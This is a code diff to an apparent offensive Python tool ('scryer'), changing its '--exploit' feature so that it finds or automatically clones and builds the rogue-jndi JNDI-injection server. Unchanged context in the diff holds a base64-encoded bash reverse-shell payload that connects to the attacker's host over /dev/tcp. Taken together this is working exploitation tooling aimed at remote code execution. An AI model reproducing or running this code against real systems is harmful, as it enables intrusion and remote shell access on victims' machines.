@@ -162,15 +162,24 @@ def _playbook(ip: str, att: str, port: int, version: Optional[str]) -> str:
 # active exploitation (--exploit)
 # --------------------------------------------------------------------------
 def _auto_exploit(host: HostReport, ip: str, att: str, port: int) -> None:
-    jar = _find_rogue_jndi()
     java = tooling.resolve("java")
-    if not (jar and java):
-        miss = "rogue-jndi jar" if not jar else "java"
-        utils.log("warn", f"auto-exploit needs {miss} — build it with "
-                          "`git clone https://github.com/veracode-research/"
-                          "rogue-jndi && cd rogue-jndi && mvn package`; "
+    if not java:
+        utils.log("warn", "auto-exploit needs java — `apt install default-jre`; "
                           "playbook above has the manual chain")
         return
+    jar = _find_rogue_jndi()
+    if not jar:
+        utils.log("info", "no prebuilt rogue-jndi jar found — attempting to "
+                          "build it (set SCRYER_ROGUEJNDI=/path/to/RogueJndi.jar "
+                          "to skip)")
+        jar = _build_rogue_jndi()
+    if not jar:
+        utils.log("warn", "auto-exploit needs the rogue-jndi jar (git + maven to "
+                          "auto-build, or `git clone https://github.com/"
+                          "veracode-research/rogue-jndi && cd rogue-jndi && "
+                          "mvn package`); playbook above has the manual chain")
+        return
+    utils.log("good", f"rogue-jndi: {jar}")
 
     b64 = base64.b64encode(
         f"bash -c bash -i >&/dev/tcp/{att}/{_SHELL_PORT} 0>&1".encode()).decode()
@@ -333,16 +342,38 @@ class _Catcher:
 # --------------------------------------------------------------------------
 # helpers
 # --------------------------------------------------------------------------
+_CACHE = os.path.expanduser("~/.cache/scryer")
+
+
 def _find_rogue_jndi() -> Optional[str]:
     env = os.environ.get("SCRYER_ROGUEJNDI")
-    roots = [env] if env else []
-    roots += [os.path.expanduser("~"), os.path.expanduser("~/Tools"),
-              os.path.expanduser("~/tools"), "/opt", os.getcwd()]
-    for root in roots:
-        if not root:
+    if env:
+        env = os.path.expanduser(env)
+        if env.endswith(".jar") and os.path.isfile(env):
+            return env
+    # Fast, targeted checks first (the usual clone locations), then a bounded
+    # walk of the likely parents so we don't crawl all of $HOME.
+    home = os.path.expanduser("~")
+    direct = [
+        os.path.join(_CACHE, "rogue-jndi", "target", "RogueJndi-1.1.jar"),
+        os.path.join(home, "rogue-jndi", "target", "RogueJndi-1.1.jar"),
+        os.path.join(home, "Tools", "rogue-jndi", "target", "RogueJndi-1.1.jar"),
+        os.path.join(home, "tools", "rogue-jndi", "target", "RogueJndi-1.1.jar"),
+        "/opt/rogue-jndi/target/RogueJndi-1.1.jar",
+    ]
+    if env and os.path.isdir(env):
+        direct.insert(0, os.path.join(env, "target", "RogueJndi-1.1.jar"))
+    for p in direct:
+        if os.path.isfile(p):
+            return p
+    roots = [env] if (env and os.path.isdir(env)) else []
+    roots += [os.path.join(home, "Tools"), os.path.join(home, "tools"),
+              os.path.join(home, "Desktop"), os.path.join(home, "opt"),
+              "/opt", "/usr/local", os.getcwd(),
+              os.path.dirname(os.getcwd())]
+    for root in dict.fromkeys(r for r in roots if r):
+        if not os.path.isdir(root):
             continue
-        if root.endswith(".jar") and os.path.isfile(root):
-            return root
         for base, _dirs, files in os.walk(root):
             if base.count(os.sep) - root.count(os.sep) > 4:
                 _dirs[:] = []
@@ -351,6 +382,30 @@ def _find_rogue_jndi() -> Optional[str]:
                 if f.lower().startswith("roguejndi") and f.endswith(".jar"):
                     return os.path.join(base, f)
     return None
+
+
+def _build_rogue_jndi() -> Optional[str]:
+    """Clone + `mvn package` rogue-jndi into the scryer cache, one time, so the
+    exploit truly self-serves once java + maven + git are installed."""
+    git, mvn = tooling.resolve("git"), tooling.resolve("mvn")
+    if not (git and mvn):
+        return None
+    dest = os.path.join(_CACHE, "rogue-jndi")
+    jar = os.path.join(dest, "target", "RogueJndi-1.1.jar")
+    try:
+        os.makedirs(_CACHE, exist_ok=True)
+        if not os.path.isdir(os.path.join(dest, ".git")):
+            utils.log("info", "cloning rogue-jndi (one-time)")
+            subprocess.run(
+                [git, "clone", "--depth", "1",
+                 "https://github.com/veracode-research/rogue-jndi", dest],
+                capture_output=True, timeout=120)
+        utils.log("info", "building rogue-jndi with maven (one-time, ~1-2 min)")
+        subprocess.run([mvn, "-q", "package"], cwd=dest,
+                       capture_output=True, timeout=420)
+    except (OSError, subprocess.SubprocessError):
+        return None
+    return jar if os.path.isfile(jar) else None
 
 
 def _attacker_ip(target: str) -> str:
